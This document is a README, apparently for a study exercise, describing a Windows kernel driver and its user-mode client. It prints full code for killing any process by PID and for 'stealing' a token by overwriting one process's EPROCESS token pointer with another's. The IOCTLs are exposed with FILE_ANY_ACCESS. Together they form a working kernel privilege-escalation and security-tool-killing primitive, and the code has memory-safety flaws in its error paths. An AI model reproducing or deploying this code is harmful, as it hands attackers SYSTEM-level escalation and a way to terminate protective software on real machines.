# Windows driver. Windows Driver Development

## Задача - написать драйвер, завершающий процесс по его PID, забирающий токен процесса по PID

+ Driver main `IRP_MJ_DEVICE_CONTROL` IOCTL handler

```C++
extern "C" NTSTATUS HandleCustomIOCTL(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
/*
 * METHOD_BUFFERED
 *
 * Input Buffer = Irp->AssociatedIrp.SystemBuffer
 * Ouput Buffer = Irp->AssociatedIrp.SystemBuffer
 *
 * Input Size = Parameters.DeviceIoControl.InputBufferLength
 * Output Size = Parameters.DeviceIoControl.OutputBufferLength
 *
 * Since they both use the same location
 * so the "buffer" allocated by the I/O
 * manager is the size of the larger value (Output vs. Input)
*/
 UNREFERENCED_PARAMETER(DeviceObject);
 NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
 PIO_STACK_LOCATION stackLocation = NULL;
 CHAR msg[2048];
 
 stackLocation = IoGetCurrentIrpStackLocation(Irp);

 switch (stackLocation->Parameters.DeviceIoControl.IoControlCode)
 {
 case IOCTL_STOP_PROCESS:
 {
  DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "IOCTL_STOP_PROCESS (0x%x) issued", stackLocation->Parameters.DeviceIoControl.IoControlCode);

  // get process id
  unsigned short pid = *(unsigned short*)Irp->AssociatedIrp.SystemBuffer;
  DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Received PID from userland: %d", *(unsigned short*)Irp->AssociatedIrp.SystemBuffer);

  // open process by process id
  CLIENT_ID cid1 = { (HANDLE)pid,  0 };
  OBJECT_ATTRIBUTES attr;
  HANDLE hProcess = 0;
  InitializeObjectAttributes(&attr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
  NtStatus = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &attr, &cid1);
  if (NtStatus == STATUS_SUCCESS)
  {
   // terminate process
   NtStatus = ZwTerminateProcess(hProcess, 0);
   if (NtStatus == STATUS_SUCCESS)
   {
    ZwClose(hProcess);
    sprintf(msg, "Process has been stoped! Status 0x%x", NtStatus);
   }
   else sprintf(msg, "Process hasn't been stoped! Status 0x%x", NtStatus);
  }
  else sprintf(msg, "Process hasn't been opened! Status 0x%x", NtStatus);
  break;
 }
 case IOCTL_STEAL_TOKEN:
 {
  DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "IOCTL_STEAL_TOKEN (0x%x) issued", stackLocation->Parameters.DeviceIoControl.IoControlCode);
  
  // get target pid & source pid
  union Data
  {
   unsigned short out[2];
   unsigned int in;
  };
  Data input_data{ 0 };
  input_data.in = *(unsigned int*)Irp->AssociatedIrp.SystemBuffer;
  
  unsigned short TARGET_PID = input_data.out[0], SOURCE_PID = input_data.out[1];
  DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Received PIDs from userland: Target %d Source %d", TARGET_PID, SOURCE_PID);

  PEPROCESS sourceProcess, targetProcess;
  //NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
  ULONG tokenOffset = get_token_offset_eprocess();

  // Lookup target process
  NtStatus = PsLookupProcessByProcessId(ULongToHandle(TARGET_PID), &targetProcess);
  if (NtStatus != STATUS_SUCCESS)
  {
   sprintf(msg, "Target process (PID %d) not found!", TARGET_PID);
   ObDereferenceObject(targetProcess);
   break;
  }

  // Lookup source process
  NtStatus = PsLookupProcessByProcessId(ULongToHandle(SOURCE_PID), &sourceProcess);
  if (NtStatus != STATUS_SUCCESS)
  {
   sprintf(msg, "Source process (PID %d) not found!", SOURCE_PID);
   ObDereferenceObject(sourceProcess);
   ObDereferenceObject(targetProcess);
   return NtStatus;
  }

  // Replace target process token with source process token
  *(ULONG64*)((ULONG64)targetProcess + tokenOffset) = *(ULONG64*)((ULONG64)sourceProcess + tokenOffset);
  sprintf(msg, "Token has stolen from Source (PID %d) to Target (PID %d)!", SOURCE_PID, TARGET_PID);

  ObDereferenceObject(sourceProcess);
  ObDereferenceObject(targetProcess);
  NtStatus = STATUS_SUCCESS;
  break;
 }
 default: break;
 }

 // send out message
 size_t dwDataSize = strlen(msg);
 if (stackLocation->Parameters.DeviceIoControl.OutputBufferLength
  >= dwDataSize)
 {
  /*
  * We use "RtlCopyMemory" in the kernel instead of memcpy.
  * RtlCopyMemory *IS* memcpy, however it's best to use the
  * wrapper in case this changes in the future.
  */
  DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Sending to userland: %s", msg);
  RtlCopyMemory(Irp->AssociatedIrp.SystemBuffer, msg, dwDataSize);
  Irp->IoStatus.Information = dwDataSize;
 }
 else
 {
  DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Buffer is too small, need: %d", dwDataSize);
  Irp->IoStatus.Information = dwDataSize;
  NtStatus = STATUS_BUFFER_TOO_SMALL;
 }

 IoCompleteRequest(Irp, IO_NO_INCREMENT); 
 return NtStatus;
}
```

+ user-mode space driver's caller

```C++
#include <iostream>
#include <Windows.h>
#include <string>

#define IOCTL_STOP_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_STEAL_TOKEN CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

void usage(char* arg0)
{
    printf("Usage: \n\t%s [PID] - for stop process with PID\n\t%s [TARGET_PID] [SOURCE_PID] - for steal token from Source to Target\n", arg0, arg0);
}

int main(char argc, char** argv)
{
    CHAR outBuffer[4096] = { 0 };
    HANDLE device = INVALID_HANDLE_VALUE;
    BOOL status = FALSE;
    DWORD bytesReturned = 0;
    device = CreateFileW(L"\\\\.\\WindowsDriverLink", GENERIC_WRITE | GENERIC_READ | GENERIC_EXECUTE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if (device == INVALID_HANDLE_VALUE)
    {
        printf_s("> Could not open device: 0x%x\n", GetLastError());
        return -1;
    }
    else if (argc == 2)
    {
        unsigned short inBuffer = std::stoi(argv[1]);
        printf_s("> Issuing IOCTL_STOP_PROCESS 0x%x\n", IOCTL_STOP_PROCESS);
        status = DeviceIoControl(device, IOCTL_STOP_PROCESS, &inBuffer, sizeof(inBuffer), outBuffer, sizeof(outBuffer), &bytesReturned, (LPOVERLAPPED)NULL);
        printf_s("> IOCTL_STOP_PROCESS 0x%x issued\n", IOCTL_STOP_PROCESS);
        printf_s("> Received from the kernel land: %s. Received buffer size: %d\n", outBuffer, bytesReturned);
    }
    else if (argc == 3) 
    {
        union Data
        {
            unsigned short out[2];
            unsigned int in;
        };

        Data input_data{ 0 };
        input_data.out[0] = std::stoi(argv[1]);
        input_data.out[1] = std::stoi(argv[2]);

        unsigned int inBuffer = input_data.in;
        printf_s("> Issuing IOCTL_STEAL_TOKEN 0x%x\n", IOCTL_STEAL_TOKEN);
        status = DeviceIoControl(device, IOCTL_STEAL_TOKEN, &inBuffer, sizeof(inBuffer), outBuffer, sizeof(outBuffer), &bytesReturned, (LPOVERLAPPED)NULL);
        printf_s("> IOCTL_STEAL_TOKEN 0x%x issued\n", IOCTL_STEAL_TOKEN);
        printf_s("> Received from the kernel land: %s. Received buffer size: %d\n", outBuffer, bytesReturned);
    }
    else
    {
        usage(argv[0]);
        return -1;
    }
    CloseHandle(device);
    return 0;
}
```

## userland

+ содержит код программы вызова windows_driver'а из ring-3 (user-mode)

```PYTHON
Usage:
        userland.exe [PID] - for stop process with PID
        userland.exe [TARGET_PID] [SOURCE_PID] - for steal token from Source to Target
```

## windows_driver

+ содержит код KMDF драйвера для работы в ring-0 (kernel-mode)

## bin

+ userland.exe - compiled userland
+ windows_driver.sys - compiled windows_driver
+ windows_driver.cer - test driver's sing public key

## Для проверки корректной работы использовались

+ ```Windows 11 версии 10.0.22621.3155```
+ ```Dbgview```
+ ```procexp```
+ ```OSR driver loader```

## Пример работы

![alt text](/img/windows_driver.gif)
